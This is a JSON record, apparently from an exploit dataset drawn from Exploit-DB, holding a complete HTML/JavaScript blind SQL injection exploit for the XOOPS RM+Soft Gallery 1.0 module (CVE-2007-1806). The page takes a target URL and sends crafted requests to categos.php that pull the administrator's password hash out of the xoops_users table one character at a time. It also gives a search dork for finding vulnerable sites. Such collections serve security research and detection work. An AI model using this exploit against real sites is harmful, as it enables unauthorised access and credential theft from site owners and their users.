{
  "id": "3633",
  "title": "XOOPS Module RM+Soft Gallery 1.0 - Blind SQL Injection",
  "cve": "CVE-2007-1806",
  "vuln_type": "sqli",
  "code": "<html>\r\n<head>\r\n<title>XOOPS Module RM+Soft Gallery 1.0(categos.php) BLIND SQL Injection Exploit</title>\r\n\r\n<script type=\"text/javascript\">\r\n\r\n//'===============================================================================================\r\n//'[Script Name: XOOPS Module RM+Soft Gallery 1.0 (categos.php) BLIND SQL Injection Exploit\r\n//'[Coded by   : ajann\r\n//'[Author     : ajann\r\n//'[Contact    : :(\r\n//'[Dork       : inurl:/modules/rmgallery/\r\n//'[S.Page     : http://www.redmexico.com.mx/\r\n//'[$$         : Free\r\n//'[Using      : Write Target after Submit Click\r\n//'===============================================================================================\r\n\r\n\r\n   function nesneyarat() {\r\n\r\n var nesne;\r\n var tarayici = navigator.appName;\r\n\r\n   \r\n     if(tarayici == \"Microsoft Internet Explorer\"){\r\n nesne = new ActiveXObject(\"Microsoft.XMLHTTP\");\r\n    }\r\n  else {\r\n nesne = new XMLHttpRequest();\r\n\r\n  }\r\nreturn nesne;\r\n}\r\n\r\n var http = nesneyarat();\r\n\r\n\r\n\r\n   function islemlink(adresyolla,charyolla) {\r\n\r\ngenreidim=document.getElementById('genreid').value + \"'\"\r\nfile=\"/modules/rmgallery/categos.php?idcat=\" + genreidim\r\npathim=document.getElementById('path').value + file\r\nkarakterim=document.getElementById('karakter').value + charyolla\r\nadres=document.getElementById('adresim').value + pathim +  adresyolla + karakterim\r\n\r\n\r\n \r\n\r\n http.open('get', adres);\r\n http.onreadystatechange = cevapFonksiyonu;\r\n http.send(null);\r\n   \r\n\r\n}\r\n\r\n\r\n\r\n   function cevapFonksiyonu() {\r\n if(http.readyState == 4){\r\ndocument.getElementById('mesaj').value = http.responseText;\r\nyonlendir();\r\n\r\n}\r\n}\r\n\r\n\r\n\r\nfunction yonlendir() {\r\n\r\n  if (document.getElementById('mesaj').value.indexOf('Bilder auf', 0) == -1) {\r\n alert('False');\r\n\r\n\r\n  }\r\n\r\n if (document.getElementById('mesaj').value.indexOf('Bilder auf', 0) != -1)  {\r\n   alert('TRUEEEEEEE');\r\n   }\r\n \r\n\r\n\r\n  }\r\n\r\nfunction dal() {\r\n\r\nif (document.getElementById('buton').value == \"Test Character(0)\") {\r\n \r\n document.getElementById('buton').disabled = true;\r\nislemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=48)/*');\r\n   document.getElementById('buton').value = \"Test Character(1)\"\r\n setTimeout(\"document.getElementById('buton').disabled = false;\",2000);\r\nreturn false;\r\n\r\n }\r\n\r\nif (document.getElementById('buton').value == \"Test Character(1)\") {\r\n \r\n document.getElementById('buton').disabled = true;\r\nislemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=49)/*');\r\n   document.getElementById('buton').value = \"Test Character(2)\"\r\n setTimeout(\"document.getElementById('buton').disabled = false;\",2000);\r\nreturn false;\r\n\r\n }\r\n\r\nif (document.getElementById('buton').value == \"Test Character(2)\") {\r\n \r\n document.getElementById('buton').disabled = true;\r\nislemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=50)/*');\r\n   document.getElementById('buton').value = \"Test Character(3)\"\r\n setTimeout(\"document.getElementById('buton').disabled = false;\",2000);\r\nreturn false;\r\n\r\n }\r\n\r\nif (document.getElementById('buton').value == \"Test Character(3)\") {\r\n \r\n document.getElementById('buton').disabled = true;\r\nislemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=51)/*');\r\n   document.getElementById('buton').value = \"Test Character(4)\"\r\n setTimeout(\"document.getElementById('buton').disabled = false;\",2000);\r\nreturn false;\r\n\r\n }\r\n\r\nif (document.getElementById('buton').value == \"Test Character(4)\") {\r\n \r\n document.getElementById('buton').disabled = true;\r\nislemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=52)/*');\r\n   document.getElementById('buton').value = \"Test Character(5)\"\r\n setTimeout(\"document.getElementById('buton').disabled = false;\",2000);\r\nreturn false;\r\n\r\n }\r\n\r\nif (document.getElementById('buton').value == \"Test Character(5)\") {\r\n \r\n document.getElementById('buton').disabled = true;\r\nislemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=53)/*');\r\n   document.getElementById('buton').value = \"Test Character(6)\"\r\n setTimeout(\"document.getElementById('buton').disabled = false;\",2000);\r\nreturn false;\r\n\r\n }\r\n\r\nif (document.getElementById('buton').value == \"Test Character(6)\") {\r\n \r\n document.getElementById('buton').disabled = true;\r\nislemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=54)/*');\r\n   document.getElementById('buton').value = \"Test Character(7)\"\r\n setTimeout(\"document.getElementById('buton').disabled = false;\",2000);\r\nreturn false;\r\n\r\n }\r\n\r\nif (document.getElementById('buton').value == \"Test Character(7)\") {\r\n \r\n document.getElementById('buton').disabled = true;\r\nislemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=55)/*');\r\n   document.getElementById('buton').value = \"Test Character(8)\"\r\n setTimeout(\"document.getElementById('buton').disabled = false;\",2000);\r\nreturn false;\r\n\r\n }\r\n\r\nif (document.getElementById('buton').value == \"Test Character(8)\") {\r\n \r\n document.getElementById('buton').disabled = true;\r\nislemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=56)/*');\r\n   document.getElementById('buton').value = \"Test Character(9)\"\r\n setTimeout(\"document.getElementById('buton').disabled = false;\",2000);\r\nreturn false;\r\n\r\n }\r\n\r\nif (document.getElementById('buton').value == \"Test Character(9)\") {\r\n \r\n document.getElementById('buton').disabled = true;\r\nislemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=57)/*');\r\n   document.getElementById('buton').value = \"Test Character(a)\"\r\n setTimeout(\"document.getElementById('buton').disabled = false;\",2000);\r\nreturn false;\r\n\r\n }\r\n\r\nif (document.getElementById('buton').value == \"Test Character(a)\") {\r\n \r\n document.getElementById('buton').disabled = true;\r\nislemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=97)/*');\r\n   document.getElementById('buton').value = \"Test Character(b)\"\r\n setTimeout(\"document.getElementById('buton').disabled = false;\",2000);\r\nreturn false;\r\n\r\n }\r\n\r\nif (document.getElementById('buton').value == \"Test Character(b)\") {\r\n \r\n document.getElementById('buton').disabled = true;\r\nislemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=98)/*');\r\n   document.getElementById('buton').value = \"Test Character(c)\"\r\n setTimeout(\"document.getElementById('buton').disabled = false;\",2000);\r\nreturn false;\r\n\r\n }\r\n\r\nif (document.getElementById('buton').value == \"Test Character(c)\") {\r\n \r\n document.getElementById('buton').disabled = true;\r\nislemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=99)/*');\r\n   document.getElementById('buton').value = \"Test Character(d)\"\r\n setTimeout(\"document.getElementById('buton').disabled = false;\",2000);\r\nreturn false;\r\n\r\n }\r\n\r\nif (document.getElementById('buton').value == \"Test Character(d)\") {\r\n \r\n document.getElementById('buton').disabled = true;\r\nislemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=100)/*');\r\n   document.getElementById('buton').value = \"Test Character(e)\"\r\n setTimeout(\"document.getElementById('buton').disabled = false;\",2000);\r\nreturn false;\r\n\r\n }\r\n\r\nif (document.getElementById('buton').value == \"Test Character(e)\") {\r\n \r\n document.getElementById('buton').disabled = true;\r\nislemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=101)/*');\r\n   document.getElementById('buton').value = \"Test Character(f)\"\r\n setTimeout(\"document.getElementById('buton').disabled = false;\",2000);\r\nreturn false;\r\n\r\n }\r\n\r\nif (document.getElementById('buton').value == \"Test Character(f)\") {\r\n \r\n document.getElementById('buton').disabled = true;\r\nislemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=102)/*');\r\n   document.getElementById('buton').value = \"Finished\"\r\n setTimeout(\"document.getElementById('buton').disabled = false;\",2000);\r\nreturn false;\r\n\r\n }\r\n\r\n\r\n\r\n  }\r\n\r\n\r\n</script>\r\n\r\n   </head>\r\n\r\n <body bgcolor=\"#000000\">\r\n\r\n<center>\r\n\r\n<p><b><font face=\"Verdana\" size=\"2\" color=\"#008000\">XOOPS Module RM+Soft Gallery 1.0 (categos.php) BLIND SQL Injection Exploit</font></b></p>\r\n\r\n<p></p>\r\n    <b><font face=\"Arial\" size=\"1\" color=\"#FF0000\">Target:</font><font face=\"Arial\" size=\"1\" color=\"#808080\">[http://[target]/</font><font color=\"#00FF00\" size=\"2\" face=\"Arial\">\r\n  </font><font color=\"#FF0000\" size=\"2\">&nbsp;</font></b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n  <input type=\"text\" name=\"adresim\" size=\"20\" style=\"background-color: #808000\" onmouseover=\"javascript:this.style.background='#808080';\" onmouseout=\"javascript:this.style.background='#808000';\" value=\"http://\"></p>\r\n<br>\r\n    <b><font face=\"Arial\" size=\"1\" color=\"#FF0000\">&nbsp;Path:</font><font face=\"Arial\" size=\"1\" color=\"#808080\">[http://[target]/[scriptpath]&nbsp;&nbsp;&nbsp; </font></b>\r\n  <input type=\"text\" name=\"path\" size=\"20\" style=\"background-color: #808000\" onmouseover=\"javascript:this.style.background='#808080';\" onmouseout=\"javascript:this.style.background='#808000';\" value=\"/\">\r\n  <p>\r\n    <b><font face=\"Arial\" size=\"1\" color=\"#FF0000\">&nbsp;Character:</font><font face=\"Arial\" size=\"1\" color=\"#808080\">[Md5 \r\n  Character 1-32]&nbsp;&nbsp; </font></b>\r\n  <input type=\"text\" name=\"karakter\" size=\"20\" style=\"background-color: #808000\" onmouseover=\"javascript:this.style.background='#808080';\" onmouseout=\"javascript:this.style.background='#808000';\" value=\"1\">\r\n</p>\r\n  <p>\r\n    <b><font face=\"Arial\" size=\"1\" color=\"#FF0000\">Cat Id:</font><font face=\"Arial\" size=\"1\" color=\"#808080\">[categos.php?idcat=&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ]&nbsp;&nbsp; </font></b>\r\n  <input type=\"text\" name=\"genreid\" size=\"20\" style=\"background-color: #808000\" onmouseover=\"javascript:this.style.background='#808080';\" onmouseout=\"javascript:this.style.background='#808000';\" value=\"1\">\r\n</p>\r\n  <p><input type=\"submit\" value=\"Test Character(0)\" name=\"buton\" onclick=\"dal();\"></p>\r\n<br>\r\n<textarea name=\"mesaj\" rows=\"1\" cols=\"20\" style=\"visibility:hidden\">&lt;/textarea&gt; <br>\r\n<p>\r\n\r\n<b><font face=\"Verdana\" size=\"2\" color=\"#008000\">ajann</font></b></p>\r\n</p>\r\n</center>\r\n\r\n\r\n </body>\r\n </html>\r\n\r\n# milw0rm.com [2007-04-01]",
  "url": "https://www.exploit-db.com/exploits/3633"
}